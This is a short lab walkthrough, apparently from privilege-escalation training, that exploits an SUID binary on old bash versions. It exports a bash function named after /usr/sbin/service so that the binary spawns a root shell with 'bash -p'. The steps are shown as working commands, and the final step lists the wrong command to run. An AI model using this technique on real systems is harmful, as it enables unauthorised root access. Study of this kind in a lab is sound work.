SUID SGIN EXECUTABLES  - Exploiting Shell Features
===================================================

/usr/local/bin/suid-env2 is identical to /usr/local/bin/suid-env except: IT USES THE ABSOLUTE PATH OF THE SERVICE EXECUTABLE 
(/usr/sbin/service) TO START THE APACHE2 WEBSERVER.

HOW TO EXPLOIT????

NOTE: in bash version <4.2-048 it is possible to ** define functions with names resembles to file paths. ** Then export those functions so that they are used
instead of actual executable at the file path.

LAB
1. Check the bash version:

/bin/bash --version

2.strings /usr/local/bin/suid-env2

The output:
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

NOTE:  it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
So, we will exploit that along with bash exploitable version.

3.
Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

4. Now we will run the /usr/local/bin/suid-env2 to gain a root shell

/usr/sbin/service


